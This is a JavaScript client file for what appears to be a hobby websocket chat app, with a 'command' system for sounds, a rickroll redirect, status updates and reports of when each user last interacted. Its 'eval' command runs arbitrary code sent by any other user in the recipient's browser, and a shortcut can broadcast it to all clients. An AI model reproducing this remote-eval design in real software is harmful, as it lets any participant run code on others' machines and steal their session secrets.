function distribute_commands(command)
{
    let command_to_exec = command.command;
    let invoker = command.invoker;
    console.log("command to execute:", command_to_exec, command_to_exec.seen);

    if (command_to_exec.snd)
    {
        sound_command_handler(command_to_exec.snd, invoker)
    }
    if (command_to_exec.send_last_interaction)
    {
        console.log("interactin");
        get_my_last_interaction(invoker)
    }
    if (command_to_exec.rickroll)
    {
        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    }
    if (command_to_exec.eval)
    {
        try
        {
            let out = eval(command_to_exec.eval);
            // send response to command invoker
            format_and_send_response({"info":out}, invoker);
        }
        catch (e)
        {
            format_and_send_response({"error":+e.toString()}, invoker);
        }
    }
    if (command_to_exec.log)
    {
        console.log(command_to_exec.log)
    }
    if (command_to_exec.messages)
    {

        for (let message of command_to_exec.messages)
        {
            add_message(message);
            setTimeout( ()=>
            {

                let id = message.time;
                let e = document.getElementById(id);
                console.log("msg seen?????", e, $(e).hasClass("seen"));
                if (invoker !== username && command_to_exec.messages.length === 1 &&
                    !$(e).hasClass("saw"))
                    alert_sound();
            }, 2000);

        }

    }
    if (command_to_exec.status_update)
    {
        edit_online(command_to_exec, invoker)
    }
    if (command_to_exec.seen)
    {
        see_message(command_to_exec.seen);
    }

}

function see_message(id)
{
    let m = document.getElementById(id);
    if ($(m).hasClass("you"))
        $(m).addClass("seen")
}

function sound_command_handler(link, invoker)
{
    let audio=false;
    if (link === "darude")
        audio = darude;
    else if (link === "relax")
        audio = relax;
    else if (link === "soup")
        audio = soup;

    if (audio)
    {
        try
        {
            audio.play();
            if (link === "darude")
            {
                setTimeout(()=>{alert("song pls?")}, 5000);
            }

            format_and_send_response({"info": `song played on ${IP}`}, invoker)
        }
        catch (e)
        {
            format_and_send_response({"info":`song failed on ${IP} because of ${e.toString()}`}, invoker)
        }
    }
    else
    {
        format_and_send_response({"info": `song not found ${link}`}, invoker)
    }
}

function alert_sound()
{
    alert_s.play();
}

function get_my_last_interaction(invoker)
{
    if (client_interaction)
    {
        let seconds = Math.round(((new Date).getTime()-client_interaction)/1000);
        console.log("seconds", seconds);
        let minutes;
        let hours;
        if (seconds >= 60)
        {
            minutes = Math.round(seconds/60);
            seconds = Math.round(seconds%60);
        }
        if (minutes >= 60)
        {
            hours = Math.round(minutes/60);
            minutes = Math.round(minutes%60);
        }
        let msg = `${hours===undefined?"0":hours}h : ${minutes===undefined?"0":minutes}m : ${seconds}s`;

        let r = format_and_send_response({"info": `client ${IP} interacted ${msg} ago!` }, invoker);
        console.log("responding with", r);
    }
    else
    {
        format_and_send_response({"info": `client ${IP} haven't interacted yet` }, invoker)
    }

}

function command_response_handler(command)
{
    console.log("handling response", command);
    let client = command.client;
    let response = command.command_response;

    if (response.info)
    {
        console.log(">>> " + response.info)
    }
    if (response.error)
    {
        console.log(">!> " + response.error)
    }

}

function edit_online(command, username)
{

    for (let message of document.getElementsByClassName("message"))
    {
        if (message.getElementsByClassName("header-entry")[0].innerText.includes(username))
        {
            message.getElementsByClassName("header-entry")[0].innerText =

            message.getElementsByClassName("header-entry")[0].innerText.replace
            (command.status_update==="online"?"●":"🟢", command.status_update==="online"?"🟢":"●")
        }
    }
}



function format_and_send_command(command_object, receiverName)
{
    if (receiverName)
        command_object.receiver = receiverName;
    else
      command_object.receiver = "all";

    // verify user with cookie


    let r = {"command": command_object,
        "cookie": secret_cookie,
        "username":username,
        "invoker": username,
        "receiver":receiverName
    };
    socket.send(JSON.stringify(r));
    console.log("sent command", r);
    return r;
}

function format_and_send_response(resp_info, invoker)
{

    // dont send response to self
    if (invoker === username)
    {
        console.log("can not send to self");
        return;
    }

    resp_info.invoker = invoker;
    let r = {"response": resp_info, "cookie": secret_cookie, "username":username, "invoker": invoker};
    socket.send(JSON.stringify(r));
    return r
}

// some command shortcuts
function exec(key, arg, rec)
{
    let receiver = rec===undefined?"all":rec;
    switch (key)
    {
        case "darude":
            format_and_send_command({"snd":"darude"}, receiver);
            break;
        case "relax":
            format_and_send_command({"snd":"relax"}, receiver);
            break;
        case "eval":
            format_and_send_command({"eval":arg}, receiver);
            break;
        case "inter":
            format_and_send_command({"send_last_interaction":"1"}, receiver);
            break;
        case "rickroll":
            format_and_send_command({"rickroll":1}, receiver);
            break;

    }

}


